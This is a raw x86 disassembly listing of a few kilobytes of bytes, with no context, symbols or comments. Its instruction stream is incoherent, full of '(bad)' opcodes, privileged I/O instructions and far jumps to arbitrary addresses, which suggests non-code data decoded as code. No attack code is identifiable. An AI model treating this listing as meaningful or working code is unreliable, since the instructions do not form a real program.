  41479a:	inc    esp
  41479b:	and    eax,0x9f93f5f0
  4147a0:	ja     0x4147ab
  4147a2:	fnstsw WORD PTR [ecx+0x73577a8b]
  4147a8:	xchg   BYTE PTR [eax],bl
  4147aa:	js     0x414820
  4147ac:	retf   0x1cf5
  4147af:	mov    ebp,0x53cd51c0
  4147b4:	mov    al,ds:0xbabe9677
  4147b9:	pop    esp
  4147ba:	scas   eax,DWORD PTR es:[edi]
  4147bb:	lods   eax,DWORD PTR ds:[esi]
  4147bc:	mov    ch,0x61
  4147be:	arpl   WORD PTR [esi+0x71],sp
  4147c1:	cmovno edi,DWORD PTR [ebp-0x17]
  4147c5:	push   cs
  4147c6:	xchg   edx,eax
  4147c7:	mov    esp,0x205bed92
  4147cc:	jmp    0x414764
  4147ce:	bound  eax,QWORD PTR [esi+edx*1-0x54]
  4147d2:	adc    eax,0x614162f3
  4147d7:	ja     0x4147f0
  4147d9:	iret   
  4147da:	jmp    0xd12c:0xcae44eba
  4147e1:	mov    ebp,0xce825d5e
  4147e6:	(bad)  
  4147e7:	jmp    0x4147de
  4147e9:	mov    bl,0x97
  4147eb:	fimul  WORD PTR [ebx+0x42cd5dac]
  4147f1:	stos   BYTE PTR es:[edi],al
  4147f2:	mov    ch,0xbf
  4147f4:	xchg   esi,eax
  4147f5:	pop    ds
  4147f6:	hlt    
  4147f7:	ffreep st(0)
  4147f9:	ins    BYTE PTR es:[edi],dx
  4147fa:	push   ebx
  4147fb:	jp     0x4147bd
  4147fd:	repz cwde 
  4147ff:	bound  esp,QWORD PTR [edx+0x1679b7b2]
  414805:	push   cs
  414806:	ds ret 
  414808:	and    ebp,ebp
  41480a:	test   DWORD PTR [eax+0x2f],esp
  41480d:	inc    bl
  41480f:	std    
  414810:	pusha  
  414811:	add    esp,DWORD PTR [edi-0x73]
  414814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414815:	pop    es
  414816:	cmp    eax,0xde85070c
  41481b:	xchg   esp,eax
  41481c:	add    eax,0x14c5fc39
  414821:	mov    dh,0xe3
  414823:	mov    esi,esi
  414825:	ja     0x414806
  414827:	daa    
  414828:	loope  0x414886
  41482a:	dec    esi
  41482b:	or     BYTE PTR [esi-0x69],ah
  41482e:	xor    ebx,edx
  414830:	add    eax,0x968f7f5d
  414835:	lock xchg BYTE PTR [edi],cl
  414838:	jo     0x4148ab
  41483a:	int3   
  41483b:	(bad)  
  41483c:	daa    
  41483d:	or     eax,0x388108cc
  414842:	xor    al,0x4f
  414844:	or     ebx,DWORD PTR [esp+esi*8-0x50]
  414848:	xchg   edi,eax
  414849:	out    dx,eax
  41484a:	sbb    BYTE PTR [edx+0x72],cl
  41484d:	xchg   esi,eax
  41484e:	imul   esi,DWORD PTR [ebx],0xd92df835
  414854:	dec    ebx
  414855:	cmc    
  414856:	xchg   esi,eax
  414857:	sahf   
  414858:	outs   dx,DWORD PTR ds:[esi]
  414859:	aaa    
  41485a:	(bad)  
  41485b:	jmp    0x1094aa17
  414860:	div    BYTE PTR [ecx+0x1f5dff5a]
  414866:	or     eax,0x2139d1c
  41486b:	fnstsw WORD PTR [esi+0x76]
  41486e:	aam    0xaa
  414870:	popf   
  414871:	rol    DWORD PTR [ebx+0x76],0x2e
  414875:	retf   
  414876:	fs js  0x41487d
  414879:	xor    BYTE PTR [ebx],al
  41487b:	pop    ds
  41487c:	call   0xcb99aa6d
  414881:	pop    DWORD PTR [ecx-0xa]
  414884:	pop    ds
  414885:	mov    ebp,0x74e35e5a
  41488a:	mov    ecx,0xbabc1327
  41488f:	mov    dl,0xef
  414891:	cmp    bl,al
  414893:	adc    al,0xa7
  414895:	iret   
  414896:	in     al,dx
  414897:	xor    bl,bl
  414899:	mov    cl,0xbe
  41489b:	sub    al,0xd6
  41489d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41489e:	jmp    0x414830
  4148a0:	mov    edi,0xaae3d80e
  4148a5:	pop    eax
  4148a6:	push   edi
  4148a7:	ds clc 
  4148a9:	adc    DWORD PTR [edi+0x35],0xffffffe8
  4148ad:	push   esp
  4148ae:	add    BYTE PTR [edi+0x38ea304a],cl
  4148b4:	or     bl,BYTE PTR [esi+0xb]
  4148b7:	and    eax,0x8e45b9e0
  4148bc:	jecxz  0x4148c0
  4148be:	mov    dl,0x10
  4148c0:	fstp   DWORD PTR [ebx]
  4148c2:	cmp    esp,ebx
  4148c4:	sar    DWORD PTR [ecx-0x6554d9d5],cl
  4148ca:	jp     0x4148ad
  4148cc:	dec    edx
  4148cd:	push   ecx
  4148ce:	and    BYTE PTR [edi],dh
  4148d0:	popf   
  4148d1:	lock pop edx
  4148d3:	jl     0x414921
  4148d5:	pushf  
  4148d6:	daa    
  4148d7:	out    0xa,al
  4148d9:	inc    ebp
  4148da:	pop    esi
  4148db:	aaa    
  4148dc:	into   
  4148dd:	sbb    BYTE PTR [edi-0xe],0xf8
  4148e1:	inc    edi
  4148e2:	mov    esp,0x967035fc
  4148e7:	push   0xe2c4c79c
  4148ec:	mov    esi,0x61d54d59
  4148f1:	xor    DWORD PTR [ebx+0x60d713da],ecx
  4148f7:	int3   
  4148f8:	sbb    ecx,DWORD PTR [edi+0x1e4fe0ff]
  4148fe:	sub    ebx,DWORD PTR [eax+0x3c]
  414901:	dec    esi
  414902:	push   ebp
  414903:	pop    eax
  414904:	add    BYTE PTR [ebp-0x50],ah
  414907:	arpl   WORD PTR [esi-0x69781c40],sp
  41490d:	add    ebx,DWORD PTR [esi]
  41490f:	sub    dh,ch
  414911:	mov    ecx,0x18e14793
  414916:	aad    0x19
  414918:	cwde   
  414919:	dec    ebp
  41491a:	xchg   edx,eax
  41491b:	(bad)  
  41491d:	ja     0x4148d1
  41491f:	bound  edx,QWORD PTR gs:[eax+0x29708d3c]
  414926:	out    0xc7,al
  414928:	mov    fs,eax
  41492a:	xor    edi,esp
  41492c:	std    
  41492d:	and    DWORD PTR [esi+0x47],esi
  414930:	xor    bl,BYTE PTR [ebx+0x44c08e4e]
  414936:	add    ebp,DWORD PTR ds:[ecx+0x17a6eb6b]
  41493d:	pop    es
  41493e:	in     eax,0x5
  414940:	pop    esp
  414941:	xchg   ebx,eax
  414942:	xchg   ecx,eax
  414943:	mov    BYTE PTR [edx+0xfc14b1d],ah
  414949:	(bad)  
  41494a:	into   
  41494b:	nop
  41494c:	jg     0x41495f
  41494e:	or     BYTE PTR [ecx+ebp*2+0x6980580c],dl
  414955:	mov    dh,0x62
  414957:	into   
  414958:	mov    ds,WORD PTR [esp+edx*4]
  41495b:	retf   
  41495c:	push   ebp
  41495d:	mov    bl,0x24
  41495f:	push   edi
  414960:	push   ecx
  414961:	pop    edi
  414962:	daa    
  414963:	mov    eax,0x7c8b7b43
  414968:	mov    dh,0x3b
  41496a:	hlt    
  41496b:	and    ebx,DWORD PTR [esi+0x58]
  41496e:	inc    edx
  41496f:	xchg   esi,eax
  414970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414971:	adc    eax,0x3b8e454a
  414976:	rol    BYTE PTR [ebp+ebp*8+0x3f],0xf0
  41497b:	xchg   ebx,eax
  41497c:	dec    ebx
  41497d:	ds cmc 
  41497f:	in     eax,0x81
  414981:	clc    
  414982:	adc    eax,0xbe521fe9
  414987:	push   0xffffff97
  414989:	mov    eax,0xe7119827
  41498e:	or     bh,cl
  414990:	cmc    
  414991:	push   edi
  414992:	bound  ebp,QWORD PTR [ebp+0x78]
  414995:	std    
  414996:	sub    eax,DWORD PTR [ecx+esi*8-0x17]
  41499a:	pop    esi
  41499b:	aam    0x69
  41499d:	pop    ss
  41499e:	pusha  
  41499f:	test   esi,ebx
  4149a1:	push   ebx
  4149a2:	mov    ds:0x34ec7cdb,eax
  4149a7:	ss adc edx,eax
  4149aa:	std    
  4149ab:	mov    ds:0x60e8ae0c,eax
  4149b0:	test   al,0x2
  4149b2:	call   0x88244e24
  4149b7:	imul   esi,DWORD PTR [esi-0x56],0x3f575595
  4149be:	push   edi
  4149bf:	mov    edi,0x3862191b
  4149c4:	mov    al,ds:0xb727f43d
  4149c9:	add    BYTE PTR [ebp+0x1d],cl
  4149cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149cd:	adc    DWORD PTR [edx+0x4c07f274],0x650c647c
  4149d7:	jmp    0x414a33
  4149d9:	mov    ds:0xe9b77e86,al
  4149de:	shr    bl,0xb7
  4149e1:	mov    al,BYTE PTR [esi]
  4149e3:	sub    BYTE PTR [ecx+ebp*1-0x6d],al
  4149e7:	dec    eax
  4149e8:	adc    esp,DWORD PTR [esi+0x60ad85f2]
  4149ee:	mov    ah,BYTE PTR [edx-0x15]
  4149f1:	test   al,0x23
  4149f3:	mov    ebx,0x5105ffe0
  4149f8:	call   0x1f14e5bc
  4149fd:	pop    eax
  4149fe:	cmp    al,0x36
  414a00:	adc    al,0x6e
  414a02:	int    0x6a
  414a04:	into   
  414a05:	mov    gs,WORD PTR [edi-0x6be31dda]
  414a0b:	cli    
  414a0c:	pusha  
  414a0d:	add    BYTE PTR [ebx],0x7c
  414a10:	jmp    0x4b15329f
  414a15:	or     ecx,ebx
  414a17:	aad    0xf5
  414a19:	int    0x12
  414a1b:	xchg   ecx,eax
  414a1d:	je     0x4149aa
  414a1f:	push   cs
  414a20:	pop    esi
  414a21:	xchg   esp,eax
  414a22:	mov    al,0xa9
  414a24:	call   0x2c36:0x4303a98a
  414a2b:	xchg   dl,dh
  414a2d:	pop    esi
  414a2e:	ror    BYTE PTR [edx-0x6],0xf7
  414a32:	inc    edx
  414a33:	lahf   
  414a34:	into   
  414a35:	aaa    
  414a36:	and    al,BYTE PTR [ecx]
  414a38:	ror    BYTE PTR ss:[esi+ebp*2],0xcc
  414a3d:	dec    eax
  414a3e:	push   ebp
  414a3f:	pushf  
  414a40:	and    bl,al
  414a42:	mov    ch,0x52
  414a44:	fstp   DWORD PTR [esi+edx*4]
  414a47:	mov    eax,0x1ce019df
  414a4c:	jae    0x4149d4
  414a4e:	(bad)
  414a51:	out    0x2e,eax
  414a53:	or     al,0xd3
  414a55:	xchg   ebx,eax
  414a56:	aad    0x5
  414a58:	idiv   ch
  414a5a:	aad    0xcb
  414a5c:	xlat   BYTE PTR ds:[ebx]
  414a5d:	mov    dh,0xbe
  414a5f:	(bad)  
  414a60:	xlat   BYTE PTR ds:[ebx]
  414a61:	jo     0x414a05
  414a63:	(bad)  
  414a64:	nop
  414a65:	pop    ecx
  414a66:	add    al,0x5f
  414a68:	imul   eax,DWORD PTR [ebx+0x5a10cfad],0x7630ef84
  414a72:	cmc    
  414a73:	mov    dh,0x64
  414a75:	cdq    
  414a76:	(bad)  
  414a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a78:	push   0x1fd55d14
  414a7d:	push   0x408680e5
  414a82:	xchg   ebp,eax
  414a83:	imul   edx,esp,0x3bf7e41b
  414a89:	adc    ecx,DWORD PTR [ecx]
  414a8b:	scas   eax,DWORD PTR es:[edi]
  414a8c:	nop
  414a8d:	inc    edx
  414a8e:	mov    eax,0xc9122648
  414a93:	add    al,0x2b
  414a95:	popa   
  414a96:	or     BYTE PTR [ebx+ecx*8-0x45],bl
  414a9a:	jge    0x414a42
  414a9c:	cmp    eax,0x6f0faefc
  414aa1:	jbe    0x414a44
  414aa3:	adc    eax,0x459fbcc0
  414aa8:	cmp    eax,0xcdd621a
  414aad:	in     al,0xc5
  414aaf:	mov    ebx,0x3e0fc75
  414ab4:	inc    edx
  414ab5:	outs   dx,BYTE PTR ds:[esi]
  414ab6:	mov    DWORD PTR [esi+0x9ffab33],esi
  414abc:	pop    ebx
  414abd:	push   edx
  414abe:	sub    bh,BYTE PTR [edi-0x12]
  414ac1:	sub    eax,DWORD PTR [eax-0x23774e8c]
  414ac7:	jmp    0x8855:0xed4280b7
  414ace:	mov    ecx,0x513e708
  414ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ad4:	int    0x0
  414ad6:	pop    esp
  414ad7:	jno    0x414adb
  414ad9:	enter  0x3fab,0xee
  414add:	lea    esi,[esi-0x32]
  414ae0:	jge    0x414a89
  414ae2:	xor    DWORD PTR ds:0x568d4cb5,0x4ba01e31
  414aec:	xchg   edx,eax
  414aed:	pop    edi
  414aee:	gs in  eax,0xa1
  414af1:	loopne 0x414ad6
  414af3:	inc    edx
  414af4:	in     al,0x3d
  414af6:	or     esp,DWORD PTR [esp+ebp*4]
  414af9:	push   ds
  414afa:	ins    BYTE PTR es:[edi],dx
  414afb:	pop    ss
  414afc:	call   0xd31beb0d
  414b01:	stos   DWORD PTR es:[edi],eax
  414b02:	sub    eax,ebx
  414b04:	sti    
  414b05:	xor    al,ch
  414b07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b08:	or     eax,0xe773f30c
  414b0d:	iret   
  414b0e:	mov    WORD PTR [eax],ds
  414b10:	add    ebp,DWORD PTR [edi+ebp*4-0x32ea7a61]
  414b17:	jno    0x414ad0
  414b19:	inc    edi
  414b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b1b:	pop    eax
  414b1c:	or     ebx,DWORD PTR [esi]
  414b1e:	xchg   BYTE PTR gs:[ecx+esi*2+0x1dcce177],cl
  414b26:	mov    eax,0x12649ddf
  414b2b:	and    esp,0x8085baa7
  414b31:	pop    ebx
  414b32:	push   cs
  414b33:	xor    eax,0x7ef2d3e1
  414b38:	mov    ch,0x6e
  414b3a:	dec    edx
  414b3b:	lahf   
  414b3c:	mov    dh,0x7c
  414b3e:	into   
  414b3f:	sbb    eax,0x7d3b560f
  414b44:	out    dx,eax
  414b45:	or     BYTE PTR [ebp+0x28],ch
  414b48:	dec    esi
  414b49:	enter  0xe05c,0x63
  414b4d:	(bad)  
  414b4e:	shr    BYTE PTR [eax+eiz*2],1
  414b51:	jmp    0x958d:0xc97da42f
  414b58:	sbb    ah,BYTE PTR [edi-0x17]
  414b5b:	test   al,0x66
  414b5d:	inc    ecx
  414b5e:	sub    DWORD PTR [ecx-0x5907f645],edx
  414b64:	iret   
  414b65:	popf   
  414b66:	mov    ah,0x58
  414b68:	and    DWORD PTR [edx+0x24],esp
  414b6b:	fld    st(2)
  414b6d:	sti    
  414b6e:	stos   BYTE PTR es:[edi],al
  414b6f:	mov    ds:0xd84dc654,eax
  414b74:	xchg   BYTE PTR [eax],cl
  414b76:	mov    bl,0xe0
  414b78:	out    dx,eax
  414b79:	ret    0xef25
  414b7c:	xor    BYTE PTR [esi],ch
  414b7e:	out    0x47,eax
  414b80:	imul   esp,DWORD PTR [ebp+0x64],0xffffffd9
  414b84:	daa    
  414b85:	push   edx
  414b86:	loope  0x414bde
  414b88:	outs   dx,BYTE PTR ds:[esi]
  414b89:	push   ebp
  414b8a:	stc    
  414b8b:	frstor [esi]
  414b8d:	test   eax,0xa67b446b
  414b92:	inc    esi
  414b93:	scas   al,BYTE PTR es:[edi]
  414b94:	cmp    eax,0x452df860
  414b99:	(bad)  [edi+0x77]
  414b9c:	mov    es,WORD PTR [ecx+eax*2-0x4]
  414ba0:	lods   eax,DWORD PTR ds:[esi]
  414ba1:	call   0x41f8:0x5e1cd66
  414ba8:	push   esp
  414ba9:	loope  0x414c29
  414bab:	ret    
  414bac:	mov    esp,0xbdad238
  414bb1:	das    
  414bb2:	jl     0x414b82
  414bb4:	pop    ss
  414bb5:	nop
  414bb6:	cs mov edx,0xa11a3a1a
  414bbc:	and    DWORD PTR [edx-0x73],ebx
  414bbf:	arpl   WORD PTR [ebp+esi*4-0x41],ax
  414bc3:	sub    eax,0xbcd6db8b
  414bc8:	cld    
  414bc9:	pop    eax
  414bca:	jns    0x414bca
  414bcc:	(bad)  
  414bcd:	ss fcmovu st,st(5)
  414bd0:	xor    esp,esi
  414bd2:	out    0xc9,al
  414bd4:	ins    BYTE PTR es:[edi],dx
  414bd5:	dec    eax
  414bd6:	jo     0x414c4a
  414bd8:	addr16 and edx,ebx
  414bdb:	rcr    al,1
  414bdd:	sub    eax,0xb60cdc0b
  414be2:	cwde   
  414be3:	inc    edx
  414be4:	div    BYTE PTR [eax-0x2b1082dc]
  414bea:	jecxz  0x414c4c
  414bec:	push   ecx
  414bed:	jo     0x414be9
  414bef:	jno    0x414b93
  414bf1:	iret   
  414bf2:	push   ds
  414bf3:	je     0x5d8acc91
  414bf9:	cmp    al,0x77
  414bfb:	sub    edx,edx
  414bfd:	in     eax,dx
  414bfe:	shr    DWORD PTR [esi-0x58],1
  414c01:	adc    DWORD PTR [ecx],edi
  414c03:	push   esi
  414c04:	imul   esi,DWORD PTR [esp+edx*8-0x12980a2c],0xe9b52e56
  414c0f:	repz repz pop esi
  414c12:	sar    ecx,1
  414c14:	jg     0x414c77
  414c16:	mov    eax,DWORD PTR [ebx+0x6e5ff292]
  414c1c:	ja     0x414c18
  414c1e:	das    
  414c1f:	sub    edi,DWORD PTR [esi-0x1ff13c36]
  414c25:	fwait
  414c26:	inc    edi
  414c27:	pop    ecx
  414c28:	mov    ds:0xbcb3e4a2,al
  414c2d:	data16 sbb al,0x62
  414c30:	mov    al,0xb1
  414c32:	jge    0x414c02
  414c34:	addr16 aas 
  414c36:	mov    edx,0x30aa832f
  414c3b:	push   eax
  414c3c:	push   0xfffffffa
  414c3e:	(bad)  
  414c3f:	fstp   DWORD PTR [edx-0xd]
  414c42:	cmp    al,0x44
  414c44:	inc    esp
  414c45:	stos   DWORD PTR es:[edi],eax
  414c46:	push   esi
  414c47:	sub    edx,DWORD PTR [ebx-0x7bdc6596]
  414c4d:	enter  0x510f,0xd7
  414c51:	jae    0x414bf3
  414c53:	adc    ebx,DWORD PTR [edx-0x32]
  414c56:	jb     0x414bfe
  414c58:	xchg   esi,eax
  414c59:	cmp    ch,dh
  414c5b:	cmc    
  414c5c:	mov    dl,0xe4
  414c5e:	and    BYTE PTR [edx],bh
  414c60:	sub    dh,BYTE PTR [ebp-0x3f]
  414c63:	pop    ss
  414c64:	inc    ebx
  414c65:	stos   DWORD PTR es:[edi],eax
  414c66:	mov    edx,ebx
  414c68:	push   0x919435e2
  414c6d:	jmp    0x2949b117
  414c72:	fsubr  DWORD PTR [edx]
  414c74:	dec    edx
  414c75:	das    
  414c76:	and    DWORD PTR [esi+0x4e],0x227f66e
  414c7d:	mov    ecx,0x57b3243a
  414c82:	push   ds
  414c83:	out    0xd5,al
  414c85:	scas   al,BYTE PTR es:[edi]
  414c86:	mov    ds:0x334e44f1,eax
  414c8b:	pop    eax
  414c8c:	and    esi,DWORD PTR [eax-0x31]
  414c8f:	das    
  414c90:	inc    ebp
  414c91:	inc    edx
  414c92:	push   eax
  414c93:	jne    0x414d08
  414c95:	mov    eax,ds:0x6e102ce8
  414c9a:	push   ebx
  414c9b:	scas   eax,DWORD PTR es:[edi]
  414c9c:	rcr    DWORD PTR [edx-0x3d],0x48
  414ca0:	sub    esp,DWORD PTR [ecx+0x46004771]
  414ca6:	call   0xe70a:0xe83e7fe2
  414cad:	inc    eax
  414cae:	adc    al,0xb0
  414cb0:	push   es
  414cb1:	or     al,0x21
  414cb3:	sub    edi,ebp
  414cb5:	mov    edx,0xaae3fa99
  414cba:	jbe    0x414c93
  414cbc:	out    dx,al
  414cbd:	mov    dh,0xa7
  414cbf:	jmp    0xf7bfedde
  414cc4:	sbb    DWORD PTR ds:0x6780efae,0xd
  414ccb:	fistp  QWORD PTR [edx-0x2d]
  414cce:	pop    eax
  414ccf:	dec    edi
  414cd0:	dec    ecx
  414cd1:	enter  0x969a,0xb5
  414cd5:	out    dx,al
  414cd6:	inc    esp
  414cd7:	icebp  
  414cd8:	icebp  
  414cd9:	icebp  
  414cda:	call   0x55e4af6c
  414cdf:	imul   edx,DWORD PTR [eax+0x2a71020],0xffffffb4
  414ce6:	pop    edx
  414ce7:	jae    0x414d41
  414ce9:	dec    esi
  414cea:	ret    0xad51
  414ced:	gs mov bh,bh
  414cf0:	cmp    BYTE PTR [ebp-0x1],0x4f
  414cf4:	or     al,0x1c
  414cf6:	mov    dh,0xe4
  414cf8:	mov    eax,0x9084e81f
  414cfd:	jne    0x414d25
  414cff:	sbb    ebp,edi
  414d01:	loopne 0x414caf
  414d03:	pop    ebx
  414d04:	jno    0x414d71
  414d06:	and    eax,0x7debaa46
  414d0b:	in     al,0x6a
  414d0d:	push   esp
  414d0e:	sbb    al,0x6b
  414d10:	jmp    0x3342:0x4f76d131
  414d17:	ds clc 
  414d19:	and    BYTE PTR [ebx+0x40a52e18],0x7
  414d20:	xor    BYTE PTR [ecx+0x69168bc4],al
  414d26:	cmp    DWORD PTR [edi],0xd914f4ab
  414d2c:	pusha  
  414d2d:	fdiv   DWORD PTR [edi+0x1e25c443]
  414d33:	neg    DWORD PTR [ebp+0x63995002]
  414d39:	out    0xd3,eax
  414d3b:	fwait
  414d3c:	mov    WORD PTR [edi-0x463b0073],?
  414d42:	jmp    FWORD PTR [edi]
  414d44:	ja     0x414d33
  414d46:	ja     0x414db0
  414d48:	add    bh,dh
  414d4a:	pop    edi
  414d4b:	inc    ebx
  414d4c:	inc    ebp
  414d4d:	sti    
  414d4e:	xor    al,0x9c
  414d50:	and    DWORD PTR [eax+0x52],eax
  414d53:	sbb    BYTE PTR [edi],ah
  414d55:	fcmovnbe st,st(3)
  414d57:	fst    st(4)
  414d59:	out    0x9f,eax
  414d5b:	push   cs
  414d5c:	outs   dx,DWORD PTR ds:[esi]
  414d5d:	mov    ah,0x11
  414d5f:	add    eax,0x30b911fc
  414d64:	xor    al,0xea
  414d66:	ja     0x414d16
  414d68:	retf   
  414d69:	cmp    eax,0xd16b2cdf
  414d6e:	pusha  
  414d6f:	aad    0x76
  414d71:	mov    al,ds:0x25f23511
  414d76:	push   esp
  414d77:	push   eax
  414d78:	push   ds
  414d79:	pop    ebx
  414d7a:	push   cs
  414d7b:	lods   eax,DWORD PTR ds:[esi]
  414d7c:	jo     0x414dd9
  414d7e:	xchg   ebx,eax
  414d7f:	sub    eax,0xefb58b88
  414d84:	ja     0x414d5e
  414d86:	dec    eax
  414d87:	test   DWORD PTR [edi],0x5a4f749d
  414d8d:	and    eax,0x235121f8
  414d92:	popa   
  414d93:	mov    ebp,0x507d818a
  414d98:	popf   
  414d99:	hlt    
  414d9a:	add    eax,0x24cc42d8
  414d9f:	(bad)  
  414da0:	retf   
  414da1:	jle    0x414d6c
  414da3:	cmp    edi,ebx
  414da5:	pop    ecx
  414da6:	out    dx,al
  414da7:	fsub   st,st(6)
  414da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414daa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dab:	xchg   esi,eax
  414dac:	mov    BYTE PTR [ebx-0x32],ch
  414daf:	punpcklwd mm5,DWORD PTR [esi+edi*8-0x6d]
  414db4:	and    DWORD PTR [edx],edi
  414db6:	dec    BYTE PTR [ebp+0x7a]
  414db9:	xchg   BYTE PTR [esi],bl
  414dbb:	mov    dl,BYTE PTR [eax-0x20]
  414dbe:	in     al,0x93
  414dc0:	jmp    0x867c:0xe84b3168
  414dc7:	scas   eax,DWORD PTR es:[edi]
  414dc8:	or     BYTE PTR [ebx-0x2c006f48],dh
  414dce:	jnp    0x414d97
  414dd0:	xor    cl,BYTE PTR [ebx]
  414dd2:	xchg   DWORD PTR [edx+0x1f],edi
  414dd5:	mov    ds:0xd1095d29,eax
  414dda:	sti    
  414ddb:	sahf   
  414ddc:	jmp    0x414d70
  414dde:	stos   BYTE PTR es:[edi],al
  414ddf:	call   0x2660:0xe8823005
  414de6:	ss cmp eax,0xadf859d3
  414dec:	ret    
  414ded:	mov    ch,0x70
  414def:	or     DWORD PTR [eax],ecx
  414df1:	adc    eax,0x5e11b8d0
  414df6:	push   esi
  414df7:	(bad)  
  414df8:	jae    0x414dd0
  414dfa:	loopne 0x414e38
  414dfc:	call   0x7884:0x20b739ed
  414e03:	pushf  
  414e04:	jle    0x414e22
  414e06:	pop    ebp
  414e07:	ret    
  414e08:	jge    0x414e48
  414e0a:	push   0x73
  414e0c:	lods   eax,DWORD PTR ds:[esi]
  414e0d:	and    ecx,DWORD PTR [edx]
  414e0f:	jecxz  0x414e8c
  414e11:	aad    0xdd
  414e13:	inc    edi
  414e14:	scas   al,BYTE PTR es:[edi]
  414e15:	jecxz  0x414e3b
  414e17:	cmp    DWORD PTR ds:0x69679d2e,eax
  414e1d:	mov    dl,0x78
  414e1f:	and    DWORD PTR [ecx*2-0x36f9a524],0x27a759d9
  414e2a:	adc    dh,BYTE PTR [edx-0x75db0f59]
  414e30:	retf   
  414e31:	ds jno 0x414e98
  414e34:	(bad)  
  414e35:	sub    al,0xb2
  414e37:	(bad)  
  414e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e39:	mov    ds:0xafa5ed0,al
  414e3e:	lahf   
  414e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e40:	dec    edx
  414e41:	xchg   edi,eax
  414e42:	push   0x1e
  414e44:	inc    ecx
  414e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e46:	adc    bl,al
  414e48:	mov    esi,DWORD PTR [ecx]
  414e4a:	lods   al,BYTE PTR ds:[esi]
  414e4b:	and    al,0x4e
  414e4d:	pop    ebp
  414e4e:	(bad)  
  414e4f:	call   0x78d5da39
  414e54:	sub    al,0x25
  414e56:	or     bh,BYTE PTR [ebp-0x44]
  414e59:	pop    edx
  414e5a:	xor    cl,BYTE PTR [ebx-0x1e]
  414e5d:	jne    0x414df0
  414e5f:	sub    bl,BYTE PTR [ebx-0x66]
  414e62:	mov    bl,0xbf
  414e64:	cmp    ebp,DWORD PTR [ebx+0x240b85f]
  414e6a:	jl     0x414e13
  414e6c:	das    
  414e6d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  414e6f:	dec    ebx
  414e70:	xchg   edx,eax
  414e71:	push   ecx
  414e72:	jmp    0xf1235b6
  414e77:	sub    ebx,esp
  414e79:	jp     0x414e0a
  414e7b:	mov    edi,0xf1b57732
  414e80:	sbb    DWORD PTR [ecx+0x1b0ebcb0],eax
  414e86:	cmp    BYTE PTR [ebx],cl
  414e88:	xor    cl,dl
  414e8a:	add    esp,DWORD PTR [ecx+edi*1-0x43]
  414e8e:	mov    bh,0x29
  414e90:	sbb    ah,BYTE PTR [edi]
  414e92:	out    0xad,eax
  414e94:	retf   
  414e95:	inc    eax
  414e96:	mov    ds:0xf49ed73f,al
  414e9b:	dec    eax
  414e9c:	cmp    dh,BYTE PTR ds:0x17a5602f
  414ea2:	ds stc 
  414ea4:	stc    
  414ea5:	and    al,0xfb
  414ea7:	push   cs
  414ea8:	add    dh,bl
  414eaa:	or     edi,DWORD PTR [edi]
  414eac:	push   edx
  414ead:	xor    DWORD PTR [eax],eax
  414eaf:	shl    BYTE PTR [edi+ebx*2-0x7e],cl
  414eb3:	lds    esp,FWORD PTR [ebx]
  414eb5:	int    0xae
  414eb7:	in     al,0xe4
  414eb9:	pop    es
  414eba:	popa   
  414ebb:	andps  xmm7,XMMWORD PTR ss:[ebx-0x9]
  414ec0:	daa    
  414ec1:	jg     0x414eea
  414ec3:	out    dx,al
  414ec4:	sub    DWORD PTR [ebx-0x65542760],eax
  414eca:	or     BYTE PTR [esi],al
  414ecc:	push   ds
  414ecd:	mov    bl,0x5d
  414ecf:	sti    
  414ed0:	or     bl,bl
  414ed2:	sar    ebx,cl
  414ed4:	retf   
  414ed5:	inc    ebp
  414ed6:	dec    ecx
  414ed7:	retf   0x1e40
  414eda:	cmp    edx,eax
  414edc:	js     0x414e67
  414ede:	aam    0x71
  414ee0:	pop    ebp
  414ee1:	shr    bl,1
  414ee3:	sbb    al,0x6f
  414ee5:	mov    ds:0xd51425bb,eax
  414eea:	in     al,dx
  414eeb:	mov    WORD PTR [ecx],gs
  414eed:	or     eax,DWORD PTR [eax+eax*8+0x4ac13094]
  414ef4:	xor    edx,DWORD PTR [eax-0x77b648be]
  414efa:	fldcw  WORD PTR [edi]
  414efc:	in     eax,0xa1
  414efe:	int    0x75
  414f00:	clc    
  414f01:	test   BYTE PTR [ecx-0x2a],cl
  414f04:	mov    ebp,0x6a24218d
  414f09:	fidivr DWORD PTR [esi+0x6b]
  414f0c:	(bad)  
  414f0d:	or     DWORD PTR [ebx-0x4a],ecx
  414f10:	dec    eax
  414f11:	sbb    edi,edi
  414f13:	shl    BYTE PTR [edx],1
  414f15:	xchg   DWORD PTR [eax],ebx
  414f17:	push   ecx
  414f18:	jae    0x414f71
  414f1a:	jge    0x414f3a
  414f1c:	shl    BYTE PTR [ebx+0x7c],1
  414f1f:	in     eax,dx
  414f20:	(bad)  
  414f21:	in     eax,0xbd
  414f23:	and    BYTE PTR [esi-0x10e70999],bh
  414f29:	pop    edx
  414f2a:	imul   ecx,DWORD PTR [edx],0x4e
  414f2d:	jns    0x414f56
  414f2f:	es es mov esp,0x3313262b
  414f36:	cmp    eax,0xe1dcb6aa
  414f3b:	jbe    0x414f9c
  414f3d:	outs   dx,DWORD PTR ds:[esi]
  414f3e:	xchg   edx,eax
  414f3f:	scas   al,BYTE PTR es:[edi]
  414f40:	mov    edx,0x214cc37d
  414f45:	pop    ds
  414f46:	jle    0x414fc7
  414f48:	pop    esi
  414f49:	dec    esp
  414f4a:	mov    ds:0xe5f271d2,al
  414f4f:	push   eax
  414f50:	sbb    al,0x44
  414f52:	dec    ebx
  414f53:	shl    BYTE PTR [ecx+0x184b5dc5],0x30
  414f5a:	push   ss
  414f5b:	inc    ebx
  414f5c:	shl    BYTE PTR ss:0x136f54f5,0xb2
  414f64:	cs jo  0x414f92
  414f67:	and    DWORD PTR [ebp+0x724f10ab],ebx
